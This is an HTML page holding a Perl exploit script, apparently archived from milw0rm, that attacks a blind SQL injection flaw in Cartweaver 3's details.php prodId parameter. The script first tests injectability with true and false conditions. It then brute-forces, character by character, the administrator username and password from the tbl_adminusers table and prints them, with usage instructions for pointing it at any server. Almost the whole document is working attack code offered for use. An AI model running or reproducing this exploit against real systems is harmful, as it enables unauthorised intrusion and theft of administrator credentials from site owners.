<html><head><title>Cartweaver 3 (prodId) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
######################
#
#Cartweaver 3 PHP Blind SQL Injection Substring Vulnerability
#
######################
#
#Bug by: h0yt3r
#
#Dork: n/a (brainusing required)
#
##
###Releasing it to the public
##
#
#No error messages are being returned.
#Exploit need a vaild Product ID!
#
#SQL Injection:
#http://[target]/[path]/details.php?prodId=[SQL]
#
##
#Gr33tz go to:
#b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team
#
################
use LWP::UserAgent;
my $userAgent = LWP::UserAgent-&gt;new;

usage();

$server = $ARGV[0];
$dir = $ARGV[1];
$prod_id =$ARGV[2];


print&quot;\n&quot;;
if (!$dir) { die &quot;Read Usage!\n&quot;; }


$filename =&quot;details.php&quot;;

my $vulnCheck = &quot;http://&quot;.$server.$dir.$filename;

my @Daten = (&quot;61&quot;,&quot;62&quot;,&quot;63&quot;,&quot;64&quot;,&quot;65&quot;,&quot;66&quot;,&quot;67&quot;,&quot;68&quot;,&quot;69&quot;,&quot;6A&quot;,&quot;6B&quot;,&quot;6C&quot;,&quot;6D&quot;,&quot;6E&quot;,&quot;6F&quot;,&quot;70&quot;,&quot;71&quot;,&quot;72&quot;,&quot;73&quot;,&quot;74&quot;,&quot;75&quot;,&quot;76&quot;,&quot;77&quot;,&quot;78&quot;,&quot;79&quot;,&quot;7A&quot;,&quot;3A&quot;,&quot;5F&quot;,&quot;31&quot;,&quot;32&quot;,&quot;33&quot;,&quot;34&quot;,&quot;35&quot;,&quot;36&quot;,&quot;37&quot;,&quot;38&quot;,&quot;39&quot;,&quot;30&quot;,&quot;21&quot;,&quot;23&quot;,&quot;2B&quot;,&quot;28&quot;,&quot;29&quot;,&quot;40&quot;,&quot;2D&quot;,&quot;F5&quot;,&quot;25&quot;,&quot;26&quot;,&quot;2F&quot;,&quot;3F&quot;);

print&quot;[x]Connecting:&quot;;
my $goodSite = $vulnCheck.&quot;?prodId=&quot;.$prod_id.&quot; AND 1=1&quot;;
my $badSite = $vulnCheck.&quot;?prodId=&quot;.$prod_id.&quot; AND 1=0&quot;;

my $Attack1= $userAgent-&gt;get($goodSite);
my $Attack2= $userAgent-&gt;get($badSite);
if($Attack1-&gt;is_success)
{
    print &quot; Connected \n&quot;;
    print &quot;[x]Vulnerable Check: &quot;;
    
    if($Attack2-&gt;content =~ m/No product selected./i &amp;&amp; $Attack1-&gt;content !~ m/No product selected./i)
        { print &quot;Vulnerable! \n&quot;; }
    else
        { print &quot;Not Vulnerable or wrong Product ID&quot;; exit;}
}

else
{
    print &quot; Connection Failed to &quot;.$goodSite.&quot;&quot;;
    exit;
}


my $hex=&quot;&quot;;
my $length;

print &quot;[x]Bruteforcing Length \n&quot;;

my $lengthCounter = 1;
while(1)
{
    my $url = &quot;&quot;.$vulnCheck.&quot;?prodId=&quot;.$prod_id.&quot;%20and%20LENGTH((select%20concat(admin_username,0x3a,admin_password)%20from%20tbl_adminusers%20limit%200,1))=&quot;.$lengthCounter.&quot;&quot;;
    my $Attack= $userAgent-&gt;get($url);
    my $content = $Attack-&gt;content;
    if($content !~ m/No product selected./i)
        { $length=$lengthCounter; last; }
    else
        { $lengthCounter++; }
}

print &quot;[x]Injecting Black Magic \n&quot;;

for($b=1;$b&lt;=$length;$b++)
{
    for(my $u=0;$u&lt;53;$u++)
    {    
        
        my $url = &quot;&quot;.$vulnCheck.&quot;?prodId=&quot;.$prod_id.&quot;%20and%20substring((select%20concat(admin_username,0x3a,admin_password)%20from%20tbl_adminusers%20limit%200,1),&quot;.$b.&quot;,1)%20like%200x&quot;.$Daten[$u].&quot;&quot;;
        my $Attack= $userAgent-&gt;get($url);
        my $content = $Attack-&gt;content;            
        if($content !~ m/No product selected./i)
        {            
            print &quot;[x]Found Char &quot;.$Daten[$u].&quot;\n&quot;;            
            $hex=$hex.$Daten[$u];
            last;    
        }

    }
}

print &quot;[x]Converting \n&quot;;
my $a_str = hex_to_ascii($hex);

@login = split(/\:/, $a_str);

print &quot;[x]Success! \n&quot;;
print &quot;     Username: $login[0]\n&quot;;
print &quot;     Password: $login[1]&quot;;



sub hex_to_ascii ($)
{        
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}



sub usage()
{
    print q
    {
    ######################################################
            Cartweaver 3 Remote Blind SQL Injection Exploit    
                          -Written by h0yt3r-                
    Usage: cartweaver.pl [Server] [Path] [Product ID]
    Sample:
    perl Cartweaver.pl www.site.com /cartweaver/ 13
    ######################################################
    };

} 

# milw0rm.com [2008-06-14]</pre></html>